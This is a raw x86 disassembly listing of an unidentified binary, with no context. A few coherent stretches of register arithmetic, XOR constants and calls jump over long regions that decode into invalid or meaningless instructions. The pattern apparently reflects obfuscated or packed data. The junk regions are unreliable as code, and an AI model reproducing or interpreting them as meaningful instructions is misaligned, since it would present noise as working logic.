  41305e:	gs stos DWORD PTR es:[edi],eax
  413060:	loop   0x413010
  413062:	into   
  413063:	xchg   edx,eax
  413064:	nop
  413065:	in     eax,dx
  413066:	pop    edi
  413067:	mov    ecx,0xbde85051
  41306c:	out    dx,eax
  41306d:	add    BYTE PTR [eax],al
  41306f:	mov    ecx,DWORD PTR [ebp-0x20]
  413072:	mov    edi,DWORD PTR [ebp-0x1c]
  413075:	and    eax,0x25cb
  41307a:	or     eax,ecx
  41307c:	mov    ecx,DWORD PTR [ebp-0x20]
  41307f:	mov    ecx,DWORD PTR [ebp-0x1c]
  413082:	and    edx,0x76f2
  413088:	or     edx,edi
  41308a:	xor    edx,esi
  41308c:	xor    eax,0x253b
  413091:	shld   edx,eax,0x2
  413095:	shl    eax,0x2
  413098:	shr    ecx,0x1e
  41309b:	xor    esi,esi
  41309d:	or     eax,ecx
  41309f:	or     edx,esi
  4130a1:	xor    eax,0xca79a575
  4130a6:	mov    DWORD PTR [ebp-0x20],eax
  4130a9:	mov    esi,0x9c1b89e8
  4130ae:	xor    edx,esi
  4130b0:	mov    DWORD PTR [ebp-0x1c],edx
  4130b3:	mov    eax,DWORD PTR [ebp-0x38]
  4130b6:	mov    ecx,DWORD PTR [ebp-0x34]
  4130b9:	mov    edx,DWORD PTR [ebp-0x40]
  4130bc:	mov    edi,DWORD PTR [ebp-0x3c]
  4130bf:	push   edi
  4130c0:	push   edx
  4130c1:	push   ecx
  4130c2:	push   eax
  4130c3:	call   0x416c20
  4130c8:	add    eax,0x536a
  4130cd:	jmp    0x4134a5
  4130d2:	push   edx
  4130d3:	(bad)  
  4130d4:	push   ebx
  4130d5:	jbe    0x41312a
  4130d7:	jb     0x41310b
  4130d9:	mov    dl,0xf6
  4130db:	push   eax
  4130dc:	xchg   DWORD PTR [esi+ebx*4-0x1e],edi
  4130e0:	gs mov esp,0x181848d3
  4130e6:	stos   BYTE PTR es:[edi],al
  4130e7:	adc    bl,BYTE PTR [eax]
  4130e9:	sbb    BYTE PTR [ecx+0x38],ch
  4130ec:	inc    ecx
  4130ed:	fcomip st,st(2)
  4130ef:	mov    edx,0x2c3e9be2
  4130f4:	push   0xebf0058b
  4130f9:	mov    ebp,0x165baccd
  4130fe:	je     0x413179
  413100:	push   ds
  413101:	stc    
  413102:	jl     0x413109
  413104:	inc    esi
  413105:	sbb    edi,DWORD PTR [ecx]
  413107:	add    DWORD PTR [ecx],edi
  413109:	push   0x54b7d4ff
  41310e:	out    dx,eax
  41310f:	fdivr  st(0),st
  413111:	out    0x65,eax
  413113:	push   eax
  413114:	cmc    
  413115:	xchg   ebx,eax
  413116:	sbb    eax,eax
  413118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413119:	iret   
  41311a:	mov    eax,ebp
  41311c:	leave  
  41311d:	push   0x53
  41311f:	neg    DWORD PTR [eax+0x34]
  413122:	pop    eax
  413123:	and    DWORD PTR [eax+ebp*2+0x457f531c],edi
  41312a:	sbb    eax,0xea6d381d
  41312f:	jne    0x4130d2
  413131:	dec    eax
  413132:	scas   eax,DWORD PTR es:[edi]
  413133:	icebp  
  413134:	rcr    ebp,1
  413136:	cmp    BYTE PTR [eax],0xef
  413139:	inc    ebx
  41313a:	push   0xffffffac
  41313c:	add    ebx,ebx
  41313e:	jg     0x4130c4
  413140:	mov    esp,0x63f3262d
  413145:	or     DWORD PTR [ecx],esi
  413147:	mov    DWORD PTR [ebx-0x77e168d6],ecx
  41314d:	div    BYTE PTR [ebx+0x2c]
  413150:	call   0xadb445a3
  413155:	cmp    al,BYTE PTR [ebx-0xd3fe6]
  41315b:	jmp    0xa1e3:0x97c5ef6c
  413162:	es ds push ecx
  413165:	sbb    BYTE PTR [ecx-0x59],bh
  413168:	jmp    0x4131b8
  41316a:	inc    eax
  41316b:	xchg   edi,eax
  41316c:	xor    DWORD PTR [edi+0x78a42116],eax
  413172:	imul   DWORD PTR [edx-0x170f1476]
  413178:	fdivr  QWORD PTR [edi]
  41317a:	ficom  WORD PTR [ebx]
  41317c:	jl     0x413150
  41317e:	rol    BYTE PTR [eax+0x5e],0xf4
  413182:	pop    edx
  413183:	sbb    eax,0x1b74ecc
  413188:	scas   al,BYTE PTR es:[edi]
  413189:	(bad)  
  41318a:	push   eax
  41318b:	jns    0x413185
  41318d:	xchg   edi,eax
  41318e:	pop    ds
  41318f:	xchg   edx,eax
  413190:	retf   
  413191:	fdiv   st(0),st
  413193:	repz jge 0x413213
  413196:	lds    eax,FWORD PTR [eax+0x67edc557]
  41319c:	out    0x2e,eax
  41319e:	push   ds
  41319f:	mov    bl,0xe2
  4131a1:	xor    DWORD PTR [edi+0x1c],0x4e24c0f8
  4131a8:	or     dl,bh
  4131aa:	icebp  
  4131ab:	or     BYTE PTR [edi],bl
  4131ad:	add    al,0xc3
  4131af:	popa   
  4131b0:	jbe    0x413197
  4131b2:	add    dh,BYTE PTR ds:0xaae901de
  4131b8:	pop    es
  4131b9:	(bad)  
  4131ba:	sub    ah,BYTE PTR [edx]
  4131bc:	push   edx
  4131bd:	imul   edi,DWORD PTR [edx],0xf734f93e
  4131c3:	lahf   
  4131c4:	jnp    0x413151
  4131c6:	jecxz  0x413174
  4131c8:	out    0x2e,al
  4131ca:	jle    0x413207
  4131cc:	push   esi
  4131cd:	or     dl,cl
  4131cf:	mov    cl,0x7c
  4131d1:	xchg   ebx,eax
  4131d2:	push   ebp
  4131d3:	dec    ebx
  4131d4:	(bad)  
  4131d6:	test   BYTE PTR [eax+0x33eaf541],cl
  4131dc:	or     eax,0x84fa5b33
  4131e1:	xchg   al,bl
  4131e3:	sub    DWORD PTR [ebp-0xd413149],eax
  4131e9:	adc    eax,0x592218fa
  4131ee:	lods   eax,DWORD PTR ds:[esi]
  4131ef:	mov    eax,ds:0x9dcac535
  4131f4:	sub    bh,dl
  4131f6:	adc    eax,0xc68122
  4131fb:	mov    al,0xbb
  4131fd:	test   DWORD PTR [edx],0x632b15ec
  413203:	mov    ds:0x56f5029e,eax
  413208:	jno    0x4131b4
  41320a:	and    eax,0x5ce69da4
  41320f:	mov    dh,0xc8
  413211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413212:	shr    DWORD PTR [eax-0x1c8fa18],1
  413218:	pop    ebx
  413219:	lea    esp,[ebp+eax*1+0x3]
  41321d:	test   cl,0xac
  413220:	daa    
  413221:	stos   BYTE PTR es:[edi],al
  413222:	cmp    BYTE PTR [edi-0x3af8e9f5],bl
  413228:	shr    BYTE PTR [ebp-0x39],1
  41322b:	jge    0x4132a6
  41322d:	xlat   BYTE PTR ds:[ebx]
  41322e:	test   DWORD PTR [ecx],0xcbbe1eff
  413234:	loop   0x413242
  413236:	loopne 0x4131df
  413238:	push   ecx
  413239:	scas   eax,DWORD PTR es:[edi]
  41323a:	and    DWORD PTR [ecx],0x753fe4e6
  413240:	jo     0x4131db
  413242:	or     edi,0x4
  413245:	stc    
  413246:	or     ebx,DWORD PTR [edi-0x4be5ab64]
  41324c:	jo     0x4132b4
  41324e:	pop    esi
  41324f:	(bad)  
  413250:	mov    ebx,0xd6720cb2
  413255:	sub    DWORD PTR [esi+0x49],ebp
  413258:	nop
  413259:	lahf   
  41325a:	jmp    0xa7e1:0xe7ad3e54
  413261:	xor    eax,0x14fda9a8
  413266:	imul   ebx,DWORD PTR [esi],0xffffffb7
  413269:	jp     0x4132ea
  41326b:	inc    eax
  41326c:	leave  
  41326d:	dec    esi
  41326e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41326f:	je     0x4132a2
  413271:	jb     0x413216
  413273:	fcom   st(4)
  413275:	div    BYTE PTR [ebp+0x57]
  413278:	ret    0x4b
  41327b:	(bad)  
  41327c:	js     0x41322f
  41327e:	int3   
  41327f:	xrelease mov BYTE PTR [edi-0x493e7883],bh
  413286:	jecxz  0x4132f5
  413288:	cdq    
  413289:	aam    0xd4
  41328b:	sbb    eax,0x14cebb39
  413290:	inc    edx
  413291:	cmp    eax,0xe577ad14
  413296:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  413298:	test   DWORD PTR [ebx-0x50],edi
  41329b:	pop    ds
  41329c:	xchg   edx,eax
  41329d:	aad    0x36
  41329f:	sbb    ebx,edx
  4132a1:	dec    edi
  4132a2:	mov    ecx,0x88458c27
  4132a7:	jle    0x4132ed
  4132a9:	mov    ebx,0x6f5db27b
  4132ae:	aaa    
  4132af:	stos   DWORD PTR es:[di],eax
  4132b1:	xchg   ebx,eax
  4132b2:	enter  0xf125,0x9c
  4132b6:	int    0xae
  4132b8:	adc    eax,0x8c979551
  4132bd:	int    0xcd
  4132bf:	aaa    
  4132c0:	ins    BYTE PTR es:[edi],dx
  4132c1:	sbb    esi,DWORD PTR [ebp-0x4f]
  4132c4:	inc    edx
  4132c5:	aaa    
  4132c6:	mov    dh,0xdd
  4132c8:	cmp    cl,BYTE PTR [edi+eiz*4+0x3d770f96]
  4132cf:	xchg   bl,cl
  4132d1:	mov    ebp,0xe8b967a6
  4132d6:	add    al,BYTE PTR [ebp-0x4]
  4132d9:	enter  0x916c,0xcc
  4132dd:	repnz sub eax,0xa1b2b74e
  4132e3:	aaa    
  4132e4:	jg     0x4132c9
  4132e6:	es aad 0x40
  4132e9:	push   es
  4132ea:	xor    ebx,ebx
  4132ec:	(bad)  
  4132ed:	lods   eax,DWORD PTR ds:[esi]
  4132ee:	jg     0x41336b
  4132f0:	and    eax,0x4ae7aafb
  4132f5:	ins    DWORD PTR es:[edi],dx
  4132f6:	clc    
  4132f7:	inc    edi
  4132f8:	add    eax,0x81f06790
  4132fd:	stc    
  4132fe:	jmp    0xf367:0xecf50ce3
  413305:	cmp    eax,0xdc9b3d5c
  41330a:	arpl   ax,cx
  41330c:	outs   dx,DWORD PTR ds:[esi]
  41330d:	cmc    
  41330e:	test   al,0xfe
  413310:	popa   
  413311:	arpl   di,di
  413313:	test   al,0x8c
  413315:	call   0x2feac48e
  41331a:	lods   al,BYTE PTR ds:[esi]
  41331b:	sbb    bl,BYTE PTR [eax-0x7b057693]
  413321:	(bad)  
  413322:	push   ecx
  413323:	(bad)  
  413324:	das    
  413325:	pushf  
  413326:	cli    
  413327:	int3   
  413328:	adc    BYTE PTR [edi-0x20],ch
  41332b:	sbb    DWORD PTR [edx],ebp
  41332d:	xor    esi,DWORD PTR cs:[edx-0x245124bf]
  413334:	xchg   ebp,eax
  413335:	scas   eax,DWORD PTR es:[edi]
  413336:	fiadd  DWORD PTR [ebp-0x15]
  413339:	jle    0x4132d7
  41333b:	xor    DWORD PTR [ebp+ebx*4-0x5168f266],esi
  413342:	loopne 0x4132dc
  413344:	dec    edi
  413345:	int    0x2a
  413347:	or     BYTE PTR [edx+eax*4],ah
  41334a:	sbb    DWORD PTR [eax-0x4b65d990],ecx
  413350:	test   DWORD PTR [eax-0x4be7fdb4],edi
  413356:	adc    eax,0x66446608
  41335b:	in     eax,0x27
  41335d:	sahf   
  41335e:	out    dx,eax
  41335f:	scas   eax,DWORD PTR es:[edi]
  413360:	xchg   ecx,eax
  413361:	push   ebp
  413362:	or     BYTE PTR [ebp+0x2efb52d0],bl
  413368:	jbe    0x4133cd
  41336a:	lock test eax,0x37ba2d16
  413370:	pop    eax
  413371:	lahf   
  413372:	and    BYTE PTR [eax-0x1a],cl
  413375:	or     eax,0x2121dc0c
  41337a:	or     ebx,ebp
  41337c:	jae    0x413371
  41337e:	pop    ecx
  41337f:	mov    al,0xfe
  413381:	imul   BYTE PTR [edi-0x4e310e]
  413387:	sbb    eax,DWORD PTR [ebx+ebp*2-0x22f4cfeb]
  41338e:	mov    DWORD PTR [eax-0x4be06fe9],esp
  413394:	retf   
  413395:	add    eax,0x9d62ed33
  41339a:	or     DWORD PTR [ebx-0x21],edx
  41339d:	addr16 push edx
  41339f:	aam    0xa9
  4133a1:	xor    eax,0x867b9ab0
  4133a6:	push   0x46b36c66
  4133ab:	sbb    ebp,DWORD PTR [eax]
  4133ad:	lea    esi,[edx]
  4133af:	push   edx
  4133b0:	loop   0x413352
  4133b2:	not    BYTE PTR [esi+0x10a587c2]
  4133b8:	cmc    
  4133b9:	push   ss
  4133ba:	add    al,0x6a
  4133bc:	sahf   
  4133bd:	dec    edi
  4133be:	jno    0x4133c8
  4133c0:	(bad)  
  4133c1:	cwde   
  4133c2:	dec    ebp
  4133c3:	xchg   BYTE PTR [esi],dl
  4133c5:	inc    ecx
  4133c6:	add    eax,0x7f5355b2
  4133cb:	jge    0x4133c3
  4133cd:	shl    BYTE PTR [edi],1
  4133cf:	sbb    DWORD PTR [ebx],0x6012f59f
  4133d5:	shl    DWORD PTR [eax-0x56],cl
  4133d8:	fimul  WORD PTR [ebx]
  4133da:	mov    WORD PTR [eax-0x3c],es
  4133dd:	inc    ebp
  4133de:	cmp    dh,bh
  4133e0:	cmp    dh,BYTE PTR [eax]
  4133e2:	mov    BYTE PTR [edx-0x3e],dl
  4133e5:	sub    eax,0xfbe8c15c
  4133ea:	pusha  
  4133eb:	repz sub DWORD PTR cs:[ebp-0x2adf9a39],esp
  4133f3:	cld    
  4133f4:	scas   eax,DWORD PTR es:[edi]
  4133f5:	test   DWORD PTR [edi+0x26893383],edx
  4133fb:	pop    es
  4133fc:	ins    BYTE PTR es:[edi],dx
  4133fd:	shl    DWORD PTR [edx-0x49fddf12],1
  413403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413404:	aaa    
  413405:	mov    ebx,0x6bfc11f4
  41340a:	push   0x20
  41340c:	jno    0x413431
  41340e:	cld    
  41340f:	jl     0x4133f0
  413411:	loop   0x413396
  413413:	or     DWORD PTR [ecx-0x1a],ebx
  413416:	and    al,0x78
  413418:	fs mov bh,0xdd
  41341b:	cs mov bl,0x2a
  41341e:	mov    eax,0x5076eca7
  413423:	test   al,0x3
  413425:	scas   eax,DWORD PTR es:[edi]
  413426:	(bad)  
  413428:	shr    DWORD PTR [ecx],0xb4
  41342b:	or     eax,0x5c474c21
  413430:	or     al,0xa3
  413432:	or     eax,0x12eb372c
  413437:	pusha  
  413438:	sbb    dh,ch
  41343a:	jle    0x4134b0
  41343c:	leave  
  41343d:	sub    al,0xba
  41343f:	mov    eax,0xe965fc8c
  413444:	loope  0x41343c
  413446:	es sti 
  413448:	dec    esp
  413449:	into   
  41344a:	xor    ah,BYTE PTR [edi-0x19]
  41344d:	push   esp
  41344e:	xor    BYTE PTR [ebp-0xcd72260],dl
  413454:	sub    edx,0xb59a12a5
  41345a:	xor    DWORD PTR [edi],0x46
  41345d:	fdivr  st(3),st
  41345f:	pushf  
  413460:	gs dec esi
  413462:	fs xchg esi,eax
  413464:	mov    cl,BYTE PTR [edx+ecx*1]
  413467:	inc    edi
  413468:	nop
  413469:	inc    edx
  41346a:	fnstcw WORD PTR [eax]
  41346c:	cwde   
  41346d:	ja     0x4134d6
  41346f:	mov    al,ds:0x29897f5e
  413474:	test   eax,0x84dc1e92
  413479:	mov    ds:0x5b7d18a9,al
  41347e:	xor    al,0xf8
  413480:	jg     0x4134da
  413482:	push   eax
  413483:	jns    0x413489
  413485:	fwait
  413486:	xor    eax,0xc9cf6d92
  41348b:	cwde   
  41348c:	mov    ds:0x517e1234,eax
  413491:	add    bl,BYTE PTR [ebx-0x3c]
  413494:	add    eax,DWORD PTR [ebp+0x2d]
  413497:	sub    eax,0xc0b11d3f
  41349c:	and    DWORD PTR [eax],esi
  41349e:	xchg   esp,eax
  41349f:	pop    ebp
  4134a0:	mov    ah,0xa5
  4134a2:	out    0xa0,eax
  4134a4:	hlt    
  4134a5:	adc    edx,0x9573
  4134ab:	push   0x12613
  4134b0:	push   0xae21daec
  4134b5:	push   edx
  4134b6:	push   eax
  4134b7:	call   0x42202c
  4134bc:	mov    ecx,eax
  4134be:	mov    eax,DWORD PTR [ebp-0x20]
  4134c1:	jmp    0x413899
  4134c6:	or     eax,0x221ac45b
  4134cb:	sbb    ch,BYTE PTR [edx+0x1b]
  4134ce:	jmp    DWORD PTR [edx+0x241b709f]
  4134d4:	pop    ecx
  4134d5:	stos   BYTE PTR es:[edi],al
  4134d6:	fs inc edx
  4134d8:	sbb    BYTE PTR [eax],bl
  4134da:	stos   BYTE PTR es:[edi],al
  4134db:	adc    bl,BYTE PTR [eax]
  4134dd:	sbb    BYTE PTR [ecx+0x2b],bh
  4134e0:	(bad)  
  4134e2:	dec    ebp
  4134e3:	dec    edx
  4134e4:	cmp    al,BYTE PTR [edx]
  4134e6:	push   edx
  4134e7:	jge    0x413556
  4134e9:	lods   al,BYTE PTR ds:[esi]
  4134ea:	jns    0x4134f2
  4134ec:	mov    DWORD PTR [ecx+0x3a],esi
  4134ef:	arpl   WORD PTR [edx+0x2c],si
  4134f2:	fdivr  DWORD PTR [eax-0x42]
  4134f5:	(bad)  
  4134f6:	sbb    edx,DWORD PTR [edx+0x76]
  4134f9:	aad    0xef
  4134fb:	cli    
  4134fc:	ins    DWORD PTR es:[edi],dx
  4134fd:	(bad)  
  4134fe:	cmp    BYTE PTR [ebx-0xe],ah
  413501:	lods   al,BYTE PTR ds:[esi]
  413502:	pop    eax
  413503:	mov    DWORD PTR [ecx+0x62],eax
  413506:	(bad)  
  413507:	int3   
  413508:	mov    dl,0xfd
  41350a:	push   esi
  41350b:	loopne 0x4134f1
  41350d:	ret    
  41350e:	xchg   BYTE PTR [ecx+edi*1+0x171fc054],al
  413515:	push   ebp
  413516:	les    eax,FWORD PTR [ebp-0x706bc05c]
  41351c:	sbb    ch,BYTE PTR [ebx+ebx*8]
  41351f:	push   esp
  413520:	pusha  
  413521:	fs stos BYTE PTR es:[edi],al
  413523:	mov    WORD PTR [esi],ax
  413526:	adc    ah,dh
  413528:	mov    WORD PTR [ecx-0x6baddcf6],fs
  41352e:	fistp  QWORD PTR [ebx-0x36]
  413531:	add    eax,0xa6ec1bf1
  413536:	mov    eax,ds:0x2dfde79a
  41353b:	mov    esi,0xc7826c4a
  413540:	nop
  413541:	mov    ah,0x83
  413543:	mov    ds:0x97d00a78,eax
  413548:	pop    ebx
  413549:	sbb    al,0x3c
  41354b:	std    
  41354c:	out    0x6a,eax
  41354e:	adc    eax,0x93fc7852
  413553:	arpl   WORD PTR [esi-0x6a4fcbc7],di
  413559:	push   ecx
  41355a:	mov    WORD PTR [edx+0x46],ds
  41355d:	sub    BYTE PTR [ecx+ecx*1-0x7],bl
  413561:	cmp    al,BYTE PTR [edi+0x69b2c11e]
  413567:	aaa    
  413568:	xchg   DWORD PTR [esi+0x16],ebp
  41356b:	add    eax,0x571877f9
  413570:	jne    0x4134f9
  413572:	add    eax,DWORD PTR [esi]
  413574:	pop    ss
  413575:	mov    DWORD PTR [eax-0x26203110],ebx
  41357b:	inc    esp
  41357c:	mov    esi,0xd3c3e0ef
  413581:	rol    DWORD PTR ds:0x5afb7ead,1
  413587:	add    BYTE PTR [edi+0x36],al
  41358a:	pop    ebx
  41358b:	cwde   
  41358c:	popa   
  41358d:	cmp    ch,BYTE PTR ds:0xe316ee03
  413593:	push   edx
  413594:	xchg   BYTE PTR ds:0xb7dc5377,bh
  41359a:	ins    BYTE PTR es:[edi],dx
  41359b:	(bad)  
  41359c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41359d:	test   eax,0x8ff16cba
  4135a2:	inc    ecx
  4135a3:	mov    ebx,0xd9a2fdfd
  4135a8:	xchg   ebp,eax
  4135a9:	int    0x3e
  4135ab:	cs ret 0x5f3b
  4135af:	test   al,0xff
  4135b1:	scas   al,BYTE PTR es:[edi]
  4135b2:	jno    0x41358c
  4135b4:	imul   eax,eax,0xffffffa1
  4135b7:	jo     0x413626
  4135b9:	mov    ebp,DWORD PTR [ebp+eax*4-0x29fc2084]
  4135c0:	pop    esp
  4135c1:	inc    esi
  4135c2:	sub    si,di
  4135c5:	cmc    
  4135c6:	out    0xc5,al
  4135c8:	and    al,0x65
  4135ca:	add    ch,dl
  4135cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135cd:	add    ecx,edx
  4135cf:	pop    ds
  4135d0:	imul   ecx,DWORD PTR [ebx],0xffffffc0
  4135d3:	clc    
  4135d4:	jb     0x413591
  4135d6:	fild   QWORD PTR [edi]
  4135d8:	xchg   esp,eax
  4135d9:	icebp  
  4135da:	out    0x97,eax
  4135dc:	or     ebx,ebp
  4135de:	repz push esp
  4135e0:	lds    esp,FWORD PTR [eax+0x7017162e]
  4135e6:	sub    BYTE PTR [edi],bl
  4135e8:	ins    BYTE PTR es:[edi],dx
  4135e9:	rcr    esi,cl
  4135eb:	stos   BYTE PTR es:[edi],al
  4135ec:	pop    ecx
  4135ed:	fs enter 0xdca3,0x39
  4135f2:	mov    ecx,0xaa5c77fa
  4135f7:	jb     0x413579
  4135f9:	dec    edi
  4135fa:	cmc    
  4135fb:	mov    edx,0xfb873a01
  413600:	push   ecx
  413601:	pop    ecx
  413602:	test   al,0x20
  413604:	push   ds
  413605:	scas   al,BYTE PTR es:[edi]
  413606:	(bad)  
  413607:	sub    bl,BYTE PTR [eax+0x3a]
  41360a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41360b:	sub    al,0x14
  41360d:	mov    edx,0xebc196e9
  413612:	loope  0x41361f
  413614:	or     dl,cl
  413616:	mov    ebx,0x8d0a14d7
  41361b:	adc    BYTE PTR [di],0x43
  41361f:	loope  0x41363a
  413621:	lods   eax,DWORD PTR ds:[esi]
  413622:	les    esp,FWORD PTR [esi]
  413624:	jecxz  0x4135df
  413626:	hlt    
  413627:	push   esp
  413628:	sbb    al,BYTE PTR [edx+0x207a1d02]
  41362e:	inc    ecx
  41362f:	mov    bl,0xf
  413631:	rol    edi,cl
  413633:	and    al,0x4e
  413635:	jl     0x4135bb
  413637:	cdq    
  413638:	inc    esp
  413639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41363a:	mov    ah,0x1b
  41363c:	sub    al,0x6a
  41363e:	cmp    BYTE PTR [eax+edx*4+0x6295ae78],bl
  413645:	call   0xf630:0xd90e385e
  41364c:	pushf  
  41364d:	retf   0xd082
  413650:	loop   0x413621
  413652:	mov    bh,0xc9
  413654:	xchg   BYTE PTR [ebp+0x78],bl
  413657:	ss repnz out dx,al
  41365a:	push   ebp
  41365b:	das    
  41365c:	mov    edi,0x6baab8a5
  413661:	xchg   ecx,eax
  413662:	ds or  eax,0x61a6867b
  413668:	scas   al,BYTE PTR es:[edi]
  413669:	dec    esp
  41366a:	jge    0x4136c7
  41366c:	mov    cl,0xd9
  41366e:	mov    bl,0x42
  413670:	ror    DWORD PTR [ebx+ebx*2],1
  413673:	shl    DWORD PTR [ebx-0x33fb501f],0x8f
  41367a:	dec    ecx
  41367b:	ds and al,0x5e
  41367e:	xchg   esi,eax
  41367f:	inc    ecx
  413680:	in     al,dx
  413681:	ss call 0x9619025d
  413687:	(bad)  
  413689:	lods   eax,DWORD PTR ds:[esi]
  41368a:	jmp    0x413679
  41368c:	rcl    BYTE PTR [eax],0x5a
  41368f:	xchg   ebp,eax
  413690:	adc    al,0xe4
  413692:	inc    edi
  413693:	push   DWORD PTR [edi]
  413695:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413696:	xchg   esp,eax
  413697:	adc    BYTE PTR [esi],dl
  413699:	and    DWORD PTR [edx],ecx
  41369b:	sbb    eax,0x7e2ea568
  4136a0:	inc    edx
  4136a1:	xchg   edi,eax
  4136a2:	out    0x78,eax
  4136a4:	add    DWORD PTR [esi-0x5b],0x18
  4136a8:	dec    esp
  4136a9:	adc    esi,DWORD PTR [ebp+0x5]
  4136ac:	shl    DWORD PTR [ebx+edx*2],1
  4136af:	or     edx,ebx
  4136b1:	sbb    BYTE PTR [ebx-0x5ed0384d],cl
  4136b7:	mov    ds:0x36efc937,eax
  4136bc:	sbb    BYTE PTR [ecx],cl
  4136be:	or     eax,0xf06623b
  4136c3:	js     0x41370c
  4136c5:	shr    BYTE PTR [eax+0x66],cl
  4136c8:	(bad)  [esi+0x68]
  4136cb:	jle    0x41372b
  4136cd:	xor    eax,0x9ebcda40
  4136d2:	inc    ecx
  4136d3:	xchg   ebx,eax
  4136d4:	xchg   edx,eax
  4136d5:	xor    edi,DWORD PTR [eax-0x4f]
  4136d8:	xor    dh,BYTE PTR [ebx+eax*4+0x58]
  4136dc:	mov    bl,0xb6
  4136de:	outs   dx,DWORD PTR gs:[esi]
  4136e0:	xchg   ecx,eax
  4136e1:	cli    
  4136e2:	adc    DWORD PTR [ecx],ebx
  4136e4:	icebp  
  4136e5:	scas   eax,DWORD PTR es:[edi]
  4136e6:	mov    dl,0xa2
  4136e8:	dec    ebx
  4136e9:	sbb    al,0x6c
  4136eb:	std    
  4136ec:	or     DWORD PTR [eax+0x3b],esi
  4136ef:	or     DWORD PTR [edi],ecx
  4136f1:	jmp    0x169f:0xeb1efc18
  4136f8:	test   DWORD PTR [edx+0x47],edx
  4136fb:	sar    BYTE PTR [ebp*4+0x1659645b],0xd8
  413703:	mov    ebp,0x79a1bb73
  413708:	gs rcr ch,1
  41370b:	ss gs loopne 0x4136b9
  41370f:	sbb    ch,BYTE PTR [edi]
  413711:	push   cs
  413712:	data16 jmp 0x4136d5
  413715:	inc    eax
  413716:	imul   BYTE PTR [eax]
  413718:	cmp    ecx,DWORD PTR [edi+0x19]
  41371b:	jno    0x4136b5
  41371d:	xchg   DWORD PTR [ebx-0x17e1d2a2],ebx
  413723:	push   esp
  413724:	mov    ebx,0xc903c49c
  413729:	aaa    
  41372a:	or     eax,0x25b757c4
  41372f:	imul   esi,DWORD PTR [esi-0xdfbbf7a],0x8b79bb78
  413739:	aad    0x36
  41373b:	ss jo  0x413715
  41373e:	xor    cl,al
  413740:	test   al,0x19
  413742:	sbb    esi,DWORD PTR [ebp+0x41]
  413745:	jns    0x413758
  413747:	xor    eax,0xceb34754
  41374c:	and    esp,DWORD PTR [ecx]
  41374e:	loope  0x4136f9
  413750:	hlt    
  413751:	or     edx,DWORD PTR [ebp+0x523a55b5]
  413757:	xor    BYTE PTR [edx-0x2e2b3b3c],bh
  41375d:	mov    esp,0x1ca98340
  413762:	fld    TBYTE PTR [edx-0x75]
  413765:	js     0x4137e6
  413767:	and    BYTE PTR [edi+0x37b1ce9],ch
  41376d:	daa    
  41376e:	cmp    al,0x97
  413770:	xchg   ebx,ebp
  413772:	or     al,BYTE PTR [eax+edi*8+0x64105f97]
  413779:	mov    ah,0xfb
  41377b:	aaa    
  41377c:	xor    al,0xbd
  41377e:	push   esp
  41377f:	mov    esi,0x377194a
  413784:	adc    eax,0x69d93844
  413789:	out    0x9a,al
  41378b:	cmp    al,0x48
  41378d:	sbb    al,0xdd
  41378f:	mov    al,ds:0xd0d968d5
  413794:	fcomp  QWORD PTR [eax+0x62ef3603]
  41379a:	xchg   ebp,eax
  41379b:	aas    
  41379c:	retf   0xc4a8
  41379f:	mov    edi,0x5ed68b8e
  4137a4:	push   ds
  4137a5:	aad    0xee
  4137a7:	fistp  DWORD PTR [edi-0x1637a4a2]
  4137ad:	push   cs
  4137ae:	loop   0x4137bf
  4137b0:	icebp  
  4137b1:	(bad)  
  4137b4:	jle    0x4137a1
  4137b6:	test   dl,cl
  4137b8:	and    BYTE PTR [edi],0x49
  4137bb:	and    ebx,esi
  4137bd:	retf   0x1e97
  4137c0:	xchg   DWORD PTR [esi+eax*4+0x57a9ee8],esi
  4137c7:	test   DWORD PTR cs:[ebx],esi
  4137ca:	mov    dh,0x4f
  4137cc:	ss scas eax,DWORD PTR es:[edi]
  4137ce:	lods   eax,DWORD PTR ds:[esi]
  4137cf:	sub    eax,0x81c98d39
  4137d4:	jp     0x4137cb
  4137d6:	mov    bh,dh
  4137d8:	xor    dh,dh
  4137da:	inc    edi
  4137db:	sbb    esp,edi
  4137dd:	fs xchg esp,eax
  4137df:	fisub  WORD PTR [eax-0x31]
  4137e2:	and    eax,esi
  4137e4:	fwait
  4137e5:	dec    edi
  4137e6:	mov    al,ds:0x405656d6
  4137eb:	or     DWORD PTR [ebp+0x783a9cde],0x4e
  4137f2:	push   edi
  4137f3:	test   al,0x24
  4137f5:	and    DWORD PTR [ecx],ebp
  4137f7:	push   edx
  4137f8:	popa   
  4137f9:	in     eax,dx
  4137fa:	rcr    BYTE PTR [esi+eax*4-0x3f],cl
  4137fe:	pop    es
  4137ff:	pop    edi
  413800:	and    eax,0xb3c03dd7
  413805:	cmp    ebx,ebp
  413807:	scas   al,BYTE PTR es:[edi]
  413808:	pop    ss
  413809:	and    esi,DWORD PTR [ebx]
  41380b:	mov    ch,0x9b
  41380d:	mov    esp,DWORD PTR [eax-0x1c]
  413810:	aaa    
  413811:	push   ss
  413812:	jmp    0x91a0:0x3db285b7
  413819:	dec    eax
  41381a:	push   ds
  41381b:	rdtsc  
  41381d:	cmp    dh,BYTE PTR [edx+0x4c]
  413820:	inc    edi
  413821:	cmp    esi,DWORD PTR [ebx]
  413823:	sub    BYTE PTR [eax+0x2d],0xbd
  413827:	pusha  
  413828:	jmp    0x4137bb
  41382a:	inc    edx
  41382b:	dec    edi
  41382c:	pushf  
  41382d:	lea    esp,ds:0xac271c4e
  413833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413834:	mov    DWORD PTR [edx-0x54258836],ebx
  41383a:	in     al,0x14
  41383c:	icebp  
  41383d:	(bad)  
  41383e:	mov    cl,0x74
  413840:	and    BYTE PTR [eax+0x68],bl
  413843:	add    bl,ch
  413845:	or     edi,ebx
  413847:	xor    al,0x83
  413849:	call   0x324ceb82
  41384e:	xchg   esi,eax
  41384f:	lds    esp,FWORD PTR [ebx+0xd255300]
  413855:	mov    ds:0x2d9ee464,eax
  41385a:	mov    ebx,0x7ae4f39
